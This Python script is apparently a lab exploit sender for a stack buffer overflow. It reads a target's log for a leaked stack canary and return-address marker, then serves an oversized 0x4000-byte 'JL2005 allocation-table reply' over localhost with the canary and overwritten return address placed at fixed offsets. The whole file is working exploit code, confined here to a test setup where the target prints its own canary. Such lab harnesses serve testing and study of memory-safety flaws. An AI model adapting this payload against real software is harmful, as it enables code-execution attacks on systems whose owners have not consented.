#!/usr/bin/env python3
"""W169 lab sender: waits for the target's printed canary/marker, then serves
the oversized JL2005 allocation-table reply over 127.0.0.1 only."""
import re
import socket
import sys
import time

log_path, port = sys.argv[1], int(sys.argv[2])
canary = rip = None
deadline = time.time() + 15
while time.time() < deadline and (canary is None or rip is None):
    try:
        text = open(log_path, errors="replace").read()
    except FileNotFoundError:
        text = ""
    m = re.search(r"canary=0x([0-9a-fA-F]+) marker=0x([0-9a-fA-F]+)", text)
    if m:
        canary, rip = int(m.group(1), 16), int(m.group(2), 16)
        break
    time.sleep(0.01)
override = int(sys.argv[3], 16) if len(sys.argv) > 3 and sys.argv[3] != '-' else None
if override is not None:
    canary = override
rip_override = int(sys.argv[4], 16) if len(sys.argv) > 4 and sys.argv[4] != '-' else None
if rip_override is not None:
    rip = rip_override
if canary is None:
    sys.exit("no canary/marker line from target")

payload = bytearray(b"\x5a" * 0x4000)
payload[0x3E28:0x3E30] = canary.to_bytes(8, "little")
payload[0x3E38:0x3E40] = rip.to_bytes(8, "little")

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", port))
srv.listen(1)
srv.settimeout(15)
conn, addr = srv.accept()
conn.sendall(payload)
conn.close()
srv.close()
print(f"socket_sender addr={addr[0]}:{addr[1]} bytes={len(payload)} "
      f"canary=0x{canary:016x} rip=0x{rip:016x}")
